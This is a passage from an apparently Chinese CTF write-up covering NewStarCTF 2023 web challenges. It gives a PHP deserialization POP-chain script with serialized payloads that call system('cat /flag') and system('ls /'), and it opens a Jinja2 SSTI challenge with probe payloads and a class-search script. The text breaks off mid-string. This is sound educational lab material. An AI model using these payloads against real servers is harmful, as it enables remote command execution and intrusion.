class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyClass</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$name</span>;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$property</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Unsetting property: &quot;</span> . <span class="hljs-variable">$property</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyClass</span>(<span class="hljs-string">&quot;John&quot;</span>);<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$obj</span>-&gt;name); <span class="hljs-comment">// 调用__unset()方法</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">在上面的代码中，我们定义了一个MyClass类，它有一个私有属性<span class="hljs-variable">$name</span>。当使用<span class="hljs-keyword">unset</span>()函数删除<span class="hljs-variable">$obj</span>对象的<span class="hljs-variable">$name</span>属性时，会自动调用该对象的<span class="hljs-title function_ invoke__">__unset</span>()方法。在这个例子中，<span class="hljs-title function_ invoke__">__unset</span>()方法会显示一个消息<span class="hljs-string">&quot;Unsetting property: name&quot;</span>。<br><br>注意，<span class="hljs-title function_ invoke__">__unset</span>()方法只会在访问权限允许的情况下被调用。如果属性是私有的或受保护的，只有在类的内部才能删除该属性。<br></code></pre></td></tr></table></figure><p>pop链构造脚本:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// highlight_file(__FILE__);</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Begin</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-comment">//反序列化自动调用</span><br>    <span class="hljs-comment">// public function __destruct()</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     //存在字符串比较可以调用__toString()函数=&gt;$this-&gt;name=new Then()</span><br>    <span class="hljs-comment">//     if(preg_match(&quot;/[a-zA-Z0-9]/&quot;,$this-&gt;name))&#123;</span><br>    <span class="hljs-comment">//         echo &quot;Hello&quot;;</span><br>    <span class="hljs-comment">//     &#125;else&#123;</span><br>    <span class="hljs-comment">//         echo &quot;Welcome to NewStarCTF 2023!&quot;;</span><br>    <span class="hljs-comment">//     &#125;</span><br>    <span class="hljs-comment">// &#125;</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Then</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;func = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Super</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//存在类调用，可以用于启动__invoke()函数</span><br>        <span class="hljs-comment">//$this-&gt;func=new Super()</span><br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Good Job!&quot;</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handle</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CTF</span>();<br>    &#125;<br>    <span class="hljs-comment">// public function __call($func, $vars)</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     //存在可以指定类的函数end()函数调用</span><br>    <span class="hljs-comment">//     //$this-&gt;obj=new CTF()</span><br>    <span class="hljs-comment">//     $this-&gt;obj-&gt;end();</span><br>    <span class="hljs-comment">// &#125;</span><br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Super</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Handle</span>();<br>    &#125;<br>    <span class="hljs-comment">// public function __invoke()</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     //getStr为Handle类的不存在函数所以可以用于调用__call</span><br>    <span class="hljs-comment">//     //$this-&gt;obj=new Handle()</span><br>    <span class="hljs-comment">//     $this-&gt;obj-&gt;getStr();</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-comment">// public function end()</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     die(&quot;==GAME OVER==&quot;);</span><br>    <span class="hljs-comment">// &#125;</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;handle = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WhiteGod</span>();<br>    &#125;<br>    <span class="hljs-comment">// public function end()</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     //存在变量删除函数可以调用魔术方法__unset</span><br>    <span class="hljs-comment">//     //$this-&gt;handle=new WhiteGod()</span><br>    <span class="hljs-comment">//     unset($this-&gt;handle-&gt;log);</span><br>    <span class="hljs-comment">// &#125;</span><br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WhiteGod</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>=<span class="hljs-string">&#x27;system&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>=<span class="hljs-string">&#x27;cat /flag&#x27;</span>;<br><br>    <span class="hljs-comment">// public function __unset($var)</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     //存在危险函数注入=&gt;$this-&gt;func=system,$this-&gt;var=ls /</span><br>    <span class="hljs-comment">//     ($this-&gt;func)($this-&gt;var);    </span><br>    <span class="hljs-comment">// &#125;</span><br>&#125;<br><br><span class="hljs-comment">// @unserialize($_POST[&#x27;pop&#x27;]); </span><br><span class="hljs-comment">//构造pop链:</span><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Begin</span>();<br><span class="hljs-variable">$obj</span>-&gt;name = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Then</span>();<br><span class="hljs-variable">$obj2</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj2</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$obj3</span> = <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$obj2</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj3</span>;<br><br><span class="hljs-variable">$str</span> = <span class="hljs-string">&#x27;O:5:&quot;Begin&quot;:1:&#123;s:4:&quot;name&quot;;O:4:&quot;Then&quot;:1:&#123;s:10:&quot;%00Then%00func&quot;;O:5:&quot;Super&quot;:1:&#123;s:6:&quot;%00*%00obj&quot;;O:6:&quot;Handle&quot;:1:&#123;s:6:&quot;%00*%00obj&quot;;O:3:&quot;CTF&quot;:1:&#123;s:6:&quot;handle&quot;;O:8:&quot;WhiteGod&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:9:&quot;cat /flag&quot;;&#125;&#125;&#125;&#125;&#125;&#125;&#x27;</span>;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>pop=O:5:&quot;Begin&quot;:1:&#123;s:4:&quot;name&quot;;O:4:&quot;Then&quot;:1:&#123;s:10:&quot;%00Then%00func&quot;;O:5:&quot;Super&quot;:1:&#123;s:6:&quot;%00*%00obj&quot;;O:6:&quot;Handle&quot;:1:&#123;s:6:&quot;%00*%00obj&quot;;O:3:&quot;CTF&quot;:1:&#123;s:6:&quot;handle&quot;;O:8:&quot;WhiteGod&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010133441613.png" alt="image-20231010133441613"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>pop=O:5:&quot;Begin&quot;:1:&#123;s:4:&quot;name&quot;;O:4:&quot;Then&quot;:1:&#123;s:10:&quot;%00Then%00func&quot;;O:5:&quot;Super&quot;:1:&#123;s:6:&quot;%00*%00obj&quot;;O:6:&quot;Handle&quot;:1:&#123;s:6:&quot;%00*%00obj&quot;;O:3:&quot;CTF&quot;:1:&#123;s:6:&quot;handle&quot;;O:8:&quot;WhiteGod&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:9:&quot;cat /flag&quot;;&#125;&#125;&#125;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010133746261.png" alt="image-20231010133746261"></p><h2 id="GenShin"><a href="#GenShin" class="headerlink" title="GenShin"></a>GenShin</h2><p><img src="/images/2023-11-3-newstar-3/image-20231010141411989.png" alt="image-20231010141411989"></p><p>使用Bp抓包:</p><p><img src="/images/2023-11-3-newstar-3/image-20231010141442978.png" alt="image-20231010141442978"></p><p>访问:&#x2F;secr3tofpop</p><p><img src="/images/2023-11-3-newstar-3/image-20231010141614595.png" alt="image-20231010141614595"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">secr3tofpop?name=admin<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010141800190.png" alt="image-20231010141800190"></p><p>我们输入的内容被渲染到了网页上，猜测存在ssti模板注入</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">secr3tofpop?name=&#123;%%&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010162819362.png" alt="image-20231010162819362"></p><p>可以了解到该ssti模板注入是在python3语言下的jinja2模板注入</p><p><img src="/images/2023-11-3-newstar-3/image-20231010163040317.png" alt="image-20231010163040317"></p><p>可以了解到该模板渲染是使用render_template_string()函数</p><p>先寻找类os._wrap_close：<br>寻找脚本:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;weakcallableproxy&#x27;&gt;, &lt;class &#x27;weakproxy&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, &lt;class &#x27;traceback&#x27;&gt;, &lt;class &#x27;super&#x27;&gt;, &lt;class &#x27;range&#x27;&gt;, &lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;dict_keys&#x27;&gt;, &lt;class &#x27;dict_values&#x27;&gt;, &lt;class &#x27;dict_items&#x27;&gt;, &lt;class &#x27;dict_reversekeyiterator&#x27;&gt;, &lt;class &#x27;dict_reversevalueiterator&#x27;&gt;, &lt;class &#x27;dict_reverseitemiterator&#x27;&gt;, &lt;class &#x27;odict_iterator&#x27;&gt;, &lt;class &#x27;set&#x27;&gt;, &lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;slice&#x27;&gt;, &lt;class &#x27;staticmethod&#x27;&gt;, &lt;class &#x27;complex&#x27;&gt;, &lt;class &#x27;float&#x27;&gt;, &lt;class &#x27;frozenset&#x27;&gt;, &lt;class &#x27;property&#x27;&gt;, &lt;class &#x27;managedbuffer&#x27;&gt;, &lt;class &#x27;memoryview&#x27;&gt;, &lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;enumerate&#x27;&gt;, &lt;class &#x27;reversed&#x27;&gt;, &lt;class &#x27;stderrprinter&#x27;&gt;, &lt;class &#x27;code&#x27;&gt;, &lt;class &#x27;frame&#x27;&gt;, &lt;class &#x27;builtin_function_or_method&#x27;&gt;, &lt;class &#x27;method&#x27;&gt;, &lt;class &#x27;function&#x27;&gt;, &lt;class &#x27;mappingproxy&#x27;&gt;, &lt;class &#x27;generator&#x27;&gt;, &lt;class &#x27;getset_descriptor&#x27;&gt;, &lt;class &#x27;wrapper_descriptor&#x27;&gt;, &lt;class &#x27;method-wrapper&#x27;&gt;, &lt;class &#x27;ellipsis&#x27;&gt;, &lt;class &#x27;member_descriptor&#x27;&gt;, &lt;class &#x27;types.SimpleNamespace&#x27;&gt;, &lt;class &#x27;PyCapsule&#x27;&gt;, &lt;class &#x27;longrange_iterator&#x27;&gt;, &lt;class &#x27;cell&#x27;&gt;, &lt;class &#x27;instancemethod&#x27;&gt;, &lt;class &#x27;classmethod_descriptor&#x27;&gt;, &lt;class &#x27;method_descriptor&#x27;&gt;, &lt;class &#x27;callable_iterator&#x27;&gt;, &lt;class &#x27;iterator&#x27;&gt;, &lt;class &#x27;pickle.PickleBuffer&#x27;&gt;, &lt;class &#x27;coroutine&#x27;&gt;, &lt;class &#x27;coroutine_wrapper&#x27;&gt;, &lt;class &#x27;InterpreterID&#x27;&gt;, &lt;class &#x27;EncodingMap&#x27;&gt;, &lt;class &#x27;fieldnameiterator&#x27;&gt;, &lt;class &#x27;formatteriterator&#x27;&gt;, &lt;class &#x27;BaseException&#x27;&gt;, &lt;class &#x27;hamt&#x27;&gt;, &lt;class &#x27;hamt_array_node&#x27;&gt;, &lt;class &#x27;hamt_bitmap_node&#x27;&gt;, &lt;class &#x27;hamt_collision_node&#x27;&gt;, &lt;class &#x27;keys&#x27;&gt;, &lt;class &#x27;values&#x27;&gt;, &lt;class &#x27;items&#x27;&gt;, &lt;class &#x27;Context&#x27;&gt;, &lt;class &#x27;ContextVar&#x27;&gt;, &lt;class &#x27;Token&#x27;&gt;, &lt;class &#x27;Token.MISSING&#x27;&gt;, &lt;class &#x27;moduledef&#x27;&gt;, &lt;class &#x27;module&#x27;&gt;, &lt;class &#x27;filter&#x27;&gt;, &lt;class &#x27;map&#x27;&gt;, &lt;class &#x27;zip&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._DummyModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLockManager&#x27;&gt;, &lt;class &#x27;_frozen_importlib.ModuleSpec&#x27;&gt;, &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &lt;class &#x27;classmethod&#x27;&gt;, &lt;class &#x27;_frozen_importlib.FrozenImporter&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ImportLockContext&#x27;&gt;, &lt;class &#x27;_thread._localdummy&#x27;&gt;, &lt;class &#x27;_thread._local&#x27;&gt;, &lt;class &#x27;_thread.lock&#x27;&gt;, &lt;class &#x27;_thread.RLock&#x27;&gt;, &lt;class &#x27;_io._IOBase&#x27;&gt;, &lt;class &#x27;_io._BytesIOBuffer&#x27;&gt;, &lt;class &#x27;_io.IncrementalNewlineDecoder&#x27;&gt;, &lt;class &#x27;posix.ScandirIterator&#x27;&gt;, &lt;class &#x27;posix.DirEntry&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.WindowsRegistryFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._LoaderBasics&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespacePath&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespaceLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.PathFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileFinder&#x27;&gt;, &lt;class &#x27;zipimport.zipimporter&#x27;&gt;, &lt;class &#x27;zipimport._ZipImportResourceReader&#x27;&gt;, &lt;class &#x27;codecs.Codec&#x27;&gt;, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &lt;class &#x27;codecs.StreamReaderWriter&#x27;&gt;, &lt;class &#x27;codecs.StreamRecoder&#x27;&gt;, &lt;class &#x27;_abc_data&#x27;&gt;, &lt;class &#x27;abc.ABC&#x27;&gt;, &lt;class &#x27;dict_itemiterator&#x27;&gt;, &lt;class &#x27;collections.abc.Hashable&#x27;&gt;, &lt;class &#x27;collections.abc.Awaitable&#x27;&gt;, &lt;class &#x27;collections.abc.AsyncIterable&#x27;&gt;, &lt;class &#x27;async_generator&#x27;&gt;, &lt;class &#x27;collections.abc.Iterable&#x27;&gt;, &lt;class &#x27;bytes_iterator&#x27;&gt;, &lt;class &#x27;bytearray_iterator&#x27;&gt;, &lt;class &#x27;dict_keyiterator&#x27;&gt;, &lt;class &#x27;dict_valueiterator&#x27;&gt;, &lt;class &#x27;list_iterator&#x27;&gt;, &lt;class &#x27;list_reverseiterator&#x27;&gt;, &lt;class &#x27;range_iterator&#x27;&gt;, &lt;class &#x27;set_iterator&#x27;&gt;, &lt;class &#x27;str_iterator&#x27;&gt;, &lt;class &#x27;tuple_iterator&#x27;&gt;, &lt;class &#x27;collections.abc.Sized&#x27;&gt;, &lt;class &#x27;collections.abc.Container&#x27;&gt;, &lt;class &#x27;collections.abc.Callable&#x27;&gt;, &lt;class &#x27;os._wrap_close&#x27;&gt;, &lt;class &#x27;_sitebuiltins.Quitter&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Printer&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Helper&#x27;&gt;, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &lt;class &#x27;warnings.catch_warnings&#x27;&gt;, &lt;class &#x27;__future__._Feature&#x27;&gt;, &lt;class &#x27;types.DynamicClassAttribute&#x27;&gt;, &lt;class &#x27;types._GeneratorWrapper&#x27;&gt;, &lt;class &#x27;enum.auto&#x27;&gt;, &lt;enum &#x27;Enum&#x27;&gt;, &lt;class &#x27;re.Pattern&#x27;&gt;, &lt;class &#x27;re.Match&#x27;&gt;, &lt;class &#x27;_sre.SRE_Scanner&#x27;&gt;, &lt;class &#x27;sre_parse.State&#x27;&gt;, &lt;class &#x27;sre_parse.SubPattern&#x27;&gt;, &lt;class &#x27;sre_parse.Tokenizer&#x27;&gt;, &lt;class &#x27;operator.itemgetter&#x27;&gt;, &lt;class &#x27;operator.attrgetter&#x27;&gt;, &lt;class &#x27;operator.methodcaller&#x27;&gt;, &lt;class &#x27;itertools.accumulate&#x27;&gt;, &lt;class &#x27;itertools.combinations&#x27;&gt;, &lt;class &#x27;itertools.combinations_with_replacement&#x27;&gt;, &lt;class &#x27;itertools.cycle&#x27;&gt;, &lt;class &#x27;itertools.dropwhile&#x27;&gt;, &lt;class &#x27;itertools.takewhile&#x27;&gt;, &lt;class &#x27;itertools.islice&#x27;&gt;, &lt;class &#x27;itertools.starmap&#x27;&gt;, &lt;class &#x27;itertools.chain&#x27;&gt;, &lt;class &#x27;itertools.compress&#x27;&gt;, &lt;class &#x27;itertools.filterfalse&#x27;&gt;, &lt;class &#x27;itertools.count&#x27;&gt;, &lt;class &#x27;itertools.zip_longest&#x27;&gt;, &lt;class &#x27;itertools.permutations&#x27;&gt;, &lt;class &#x27;itertools.product&#x27;&gt;, &lt;class &#x27;itertools.repeat&#x27;&gt;, &lt;class &#x27;itertools.groupby&#x27;&gt;, &lt;class &#x27;itertools._grouper&#x27;&gt;, &lt;class &#x27;itertools._tee&#x27;&gt;, &lt;class &#x27;itertools._tee_dataobject&#x27;&gt;, &lt;class &#x27;reprlib.Repr&#x27;&gt;, &lt;class &#x27;collections.deque&#x27;&gt;, &lt;class &#x27;_collections._deque_iterator&#x27;&gt;, &lt;class &#x27;_collections._deque_reverse_iterator&#x27;&gt;, &lt;class &#x27;_collections._tuplegetter&#x27;&gt;, &lt;class &#x27;collections._Link&#x27;&gt;, &lt;class &#x27;functools.partial&#x27;&gt;, &lt;class &#x27;functools._lru_cache_wrapper&#x27;&gt;, &lt;class &#x27;functools.partialmethod&#x27;&gt;, &lt;class &#x27;functools.singledispatchmethod&#x27;&gt;, &lt;class &#x27;functools.cached_property&#x27;&gt;, &lt;class &#x27;re.Scanner&#x27;&gt;, &lt;class &#x27;tokenize.Untokenizer&#x27;&gt;, &lt;class &#x27;traceback.FrameSummary&#x27;&gt;, &lt;class &#x27;traceback.TracebackException&#x27;&gt;, &lt;class &#x27;_weakrefset._IterationGuard&#x27;&gt;, &lt;class &#x27;_weakrefset.WeakSet&#x27;&gt;, &lt;class &#x27;weakref.finalize._Info&#x27;&gt;, &lt;class &#x27;weakref.finalize&#x27;&gt;, &lt;class &#x27;string.Template&#x27;&gt;, &lt;class &#x27;string.Formatter&#x27;&gt;, &lt;class &#x27;threading._RLock&#x27;&gt;, &lt;class &#x27;threading.Condition&#x27;&gt;, &lt;class &#x27;threading.Semaphore&#x27;&gt;, &lt;class &#x27;threading.Event&#x27;&gt;, &lt;class &#x27;threading.Barrier&#x27;&gt;, &lt;class &#x27;threading.Thread&#x27;&gt;, &lt;class &#x27;logging.LogRecord&#x27;&gt;, &lt;class &#x27;logging.PercentStyle&#x27;&gt;, &lt;class &#x27;logging.Formatter&#x27;&gt;, &lt;class &#x27;logging.BufferingFormatter&#x27;&gt;, &lt;class &#x27;logging.Filter&#x27;&gt;, &lt;class &#x27;logging.Filterer&#x27;&gt;, &lt;class &#x27;logging.PlaceHolder&#x27;&gt;, &lt;class &#x27;logging.Manager&#x27;&gt;, &lt;class &#x27;logging.LoggerAdapter&#x27;&gt;, &lt;class &#x27;contextlib.ContextDecorator&#x27;&gt;, &lt;class &#x27;contextlib._GeneratorContextManagerBase&#x27;&gt;, &lt;class &#x27;contextlib._BaseExitStack&#x27;&gt;, &lt;class &#x27;typing._Final&#x27;&gt;, &lt;class &#x27;typing._Immutable&#x27;&gt;, &lt;class &#x27;typing.Generic&#x27;&gt;, &lt;class &#x27;typing._TypingEmpty&#x27;&gt;, &lt;class &#x27;typing._TypingEllipsis&#x27;&gt;, &lt;class &#x27;typing.NamedTuple&#x27;&gt;, &lt;class &#x27;typing.io&#x27;&gt;, &lt;class &#x27;typing.re&#x27;&gt;, &lt;class &#x27;select.poll&#x27;&gt;, &lt;class &#x27;select.epoll&#x27;&gt;, &lt;class &#x27;selectors.BaseSelector&#x27;&gt;, &lt;class &#x27;_socket.socket&#x27;&gt;, &lt;class &#x27;Struct&#x27;&gt;, &lt;class &#x27;unpack_iterator&#x27;&gt;, &lt;class &#x27;email.charset.Charset&#x27;&gt;, &lt;class &#x27;email.header.Header&#x27;&gt;, &lt;class &#x27;email.header._ValueFormatter&#x27;&gt;, &lt;class &#x27;_sha512.sha384&#x27;&gt;, &lt;class &#x27;_sha512.sha512&#x27;&gt;, &lt;class &#x27;_random.Random&#x27;&gt;, &lt;class &#x27;datetime.timedelta&#x27;&gt;, &lt;class &#x27;datetime.date&#x27;&gt;, &lt;class &#x27;datetime.tzinfo&#x27;&gt;, &lt;class &#x27;datetime.time&#x27;&gt;, &lt;class &#x27;datetime.date&#x27;&gt;, &lt;class &#x27;datetime.timedelta&#x27;&gt;, &lt;class &#x27;datetime.time&#x27;&gt;, &lt;class &#x27;datetime.tzinfo&#x27;&gt;, &lt;class &#x27;urllib.parse._ResultMixinStr&#x27;&gt;, &lt;class &#x27;urllib.parse._ResultMixinBytes&#x27;&gt;, &lt;class &#x27;urllib.parse._NetlocResultMixinBase&#x27;&gt;, &lt;class &#x27;calendar._localized_month&#x27;&gt;, &lt;class &#x27;calendar._localized_day&#x27;&gt;, &lt;class &#x27;calendar.Calendar&#x27;&gt;, &lt;class &#x27;calendar.different_locale&#x27;&gt;, &lt;class &#x27;email._parseaddr.AddrlistClass&#x27;&gt;, &lt;class &#x27;email._policybase._PolicyBase&#x27;&gt;, &lt;class &#x27;email.feedparser.BufferedSubFile&#x27;&gt;, &lt;class &#x27;email.feedparser.FeedParser&#x27;&gt;, &lt;class &#x27;email.parser.Parser&#x27;&gt;, &lt;class &#x27;email.parser.BytesParser&#x27;&gt;, &lt;class &#x27;email.message.Message&#x27;&gt;, &lt;class &#x27;http.client.HTTPConnection&#x27;&gt;, &lt;class &#x27;_ssl._SSLContext&#x27;&gt;, &lt;class &#x27;_ssl._SSLSocket&#x27;&gt;, &lt;class &#x27;_ssl.MemoryBIO&#x27;&gt;, &lt;class &#x27;_ssl.Session&#x27;&gt;, &lt;class &#x27;ssl.SSLObject&#x27;&gt;, &lt;class &#x27;urllib3.util.timeout.Timeout&#x27;&gt;, &lt;class &#x27;_ast.AST&#x27;&gt;, &lt;class &#x27;urllib3.util.retry.Retry&#x27;&gt;, &lt;class &#x27;_hashlib.HASH&#x27;&gt;, &lt;class &#x27;_blake2.blake2b&#x27;&gt;, &lt;class &#x27;_blake2.blake2s&#x27;&gt;, &lt;class 